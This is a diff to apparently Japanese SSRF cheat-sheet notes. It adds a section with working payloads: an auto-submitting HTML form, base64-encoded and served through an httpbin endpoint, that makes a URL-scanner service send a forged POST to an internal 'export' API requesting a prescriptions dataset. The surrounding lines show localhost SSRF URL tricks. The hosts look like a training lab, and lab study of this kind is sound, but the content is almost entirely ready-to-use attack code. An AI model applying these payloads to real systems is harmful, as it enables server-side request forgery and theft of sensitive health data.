@@ -93,3 +93,22 @@ $ curl 'http://example/foo?server=127.0.0.1/win'
 ```sh
 $ curl 'http://example/foo?server=127.0.0.1/win%23'
 ```
+
+### POSTをリクエストする（httpbin）
+
+前提として、リクエスト先で httpbin が使われていること。
+
+```html
+FORM='<html><body>
+<form id=f method=POST action="http://opendata.meridianhealth.thm/api/v1/export">
+<input name=dataset value=prescriptions>
+</form>
+<script>document.getElementById("f").submit()</script>
+</body></html>'
+B64=$(printf '%s' "$FORM" | base64 -w0)
+```
+
+```sh
+curl -sS -X POST http://urlscan.meridianhealth.thm/scan \
+     --data-urlencode "url=http://httpbin.meridianhealth.thm/base64/$B64"
+```
